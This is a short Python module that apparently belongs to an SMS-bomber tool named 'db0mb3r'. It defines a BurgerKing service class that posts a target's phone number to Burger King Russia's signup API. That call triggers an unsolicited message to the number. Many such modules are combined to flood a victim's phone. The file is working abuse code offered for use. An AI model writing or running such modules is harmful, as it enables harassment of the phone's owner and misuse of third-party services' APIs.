from db0mb3r.services.service import Service

class BurgerKing(Service):
    async def run(self):
        await self.post(
            "https://burgerking.ru/middleware/bridge/api/v3/auth/signup",
            json={"phone": self.formatted_phone, "invite": ""}
        )
